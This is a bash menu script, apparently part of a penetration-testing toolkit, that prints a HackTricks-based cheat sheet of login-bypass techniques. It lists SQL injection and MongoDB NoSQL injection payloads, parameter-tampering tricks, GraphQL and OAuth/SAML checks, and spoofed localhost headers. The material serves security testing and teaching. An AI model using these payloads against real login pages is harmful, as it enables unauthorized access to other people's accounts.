#!/bin/bash
# HackTricks Ref: login-bypass
# Module: Login Bypass Techniques (Authentication Bypass)

echo -e "${C6}[WEB ATTACK: LOGIN_BYPASS]${NC}"
echo -e "Reference: https://book.hacktricks.xyz/pentesting-web/login-bypass"
echo -e "--------------------------------------------------"

echo -e "${C4}Select Bypass Vector:${NC}"
echo "1) SQL Injection (Classical & Blind)"
echo "2) NoSQL Injection (JSON/Object-based)"
echo "3) Authentication Parameter Tampering"
echo "4) GraphQL Authentication Bypass"
echo "5) OAUTH/SAML Misconfigurations"
echo "6) IP-based Bypass (Header Injection)"
echo "0) Exit"

read -p "Selection: " lb_opt

case $lb_opt in
    1)
        echo -e "\n${C2}[*] Common SQLi Auth Bypass Payloads:${NC}"
        echo "Try these in the 'username' or 'password' fields:"
        echo " - ' OR 1=1--"
        echo " - admin'--"
        echo " - ' OR '1'='1"
        echo " - \" OR \"1\"=\"1"
        echo " - admin' AND 1=1--"
        ;;
    2)
        echo -e "\n${C2}[*] NoSQL Injection Bypass (MongoDB):${NC}"
        echo "Change Content-Type to application/json and use:"
        echo " - {\"username\": {\"\$ne\": null}, \"password\": {\"\$ne\": null}}"
        echo " - {\"username\": \"admin\", \"password\": {\"\$gt\": \"\"}}"
        echo " - {\"username\": {\"\$regex\": \"admin.*\"}, \"password\": {\"\$ne\": \"1\"}}"
        ;;
    3)
        echo -e "\n${C2}[*] Parameter Tampering:${NC}"
        echo "1. Change login=false to login=true in cookies/body."
        echo "2. Add a second parameter: user=victim&user=admin."
        echo "3. Try to change the JSON key: {\"isAdmin\": true}."
        echo "4. Use high-level parameters like 'authenticated: 1'."
        ;;
    4)
        echo -e "\n${C2}[*] GraphQL Bypass:${NC}"
        echo " - Introspection: Check for login-related mutations."
        echo " - Try to access private fields without the 'Authorization' header."
        echo " - Test for Aliases to bypass rate limits on login attempts."
        ;;
    5)
        echo -e "\n${C2}[*] OAUTH/SAML Logic:${NC}"
        echo " - SAML: Check if you can modify the 'NameID' in a signed assertion."
        echo " - OAuth: Check if you can reuse an old 'code' or if 'redirect_uri' is vulnerable."
        ;;
    6)
        echo -e "\n${C2}[*] Header-based Bypass:${NC}"
        echo "Try to trick the app into thinking you are local/admin:"
        echo " - X-Forwarded-For: 127.0.0.1"
        echo " - X-Remote-Addr: 127.0.0.1"
        echo " - X-Custom-IP-Authorization: 127.0.0.1"
        ;;
    *) return ;;
esac

echo -e "\n--------------------------------------------------"
read -p "Press Enter to return..."
